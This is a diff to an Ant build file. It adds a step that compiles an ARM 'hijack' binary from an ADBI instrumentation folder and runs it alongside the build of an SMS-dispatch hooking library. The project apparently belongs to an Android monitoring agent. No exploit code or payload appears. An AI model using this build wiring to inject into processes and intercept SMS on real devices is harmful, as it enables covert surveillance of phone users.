@@ -52,6 +52,7 @@
 	<property name="ddi.sms.lib" value="procacc" />
 	<property name="ddi.sms.libout" value="libprocacc.so" />
     <property name="ddi.sms.dir" value="../instrumentation/ddi/examples/smsdispatch/" />
+    <property name="ddi.hijacker" value="../instrumentation/adbi/hijack" />
 	<property name="rcscore.path" value="antlibs" />
 	<property name="out.dir" value="bin" />
 	<property name="out.classes.absolute.dir" location="${out.dir}/classes" />
@@ -179,12 +180,25 @@
   </sequential>
 </macrodef>
 
+<macrodef name="build-hijack">
+   <attribute name="debug" />
+   <attribute name="buildDir" />
+   <sequential>
+      <echo> building hijacker @{debug} </echo>
+      <exec executable="./build.sh" dir="@{buildDir}" failonerror="true">
+        <arg value="@{debug}" />
+     </exec>
+     <copy file="@{buildDir}/libs/armeabi/hijack" tofile="preprocess/hijack" overwrite="true" />
+  </sequential>
+</macrodef>
 
 <target name="build-instrumentation-debug" depends="build-instrumentation-clean">
+  <build-hijack debug="-d"  buildDir="${ddi.hijacker}" />
   <build-instr debug="-d"  lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
 </target>
 
 <target name="build-instrumentation" depends="build-instrumentation-clean">
+  <build-hijack debug="-D"  buildDir="${ddi.hijacker}" />
   <build-instr debug=""   lib="-l${ddi.sms.lib}" buildDir="${ddi.sms.dir}" buildScript="./build-dex.sh"  />
 </target>
 
@@ -273,6 +287,7 @@
 				<case value="v2" >
 
 					<!-- Alzare l'api level in caso di 3.x o 4.x -->
+					<echo message="Copy BackGround" />
 					<echo message="Copy BackGround" />
 
 					<copy file="preprocess/AndroidManifest.BACKGROUND.xml" tofile="AndroidManifest.xml" overwrite="true">
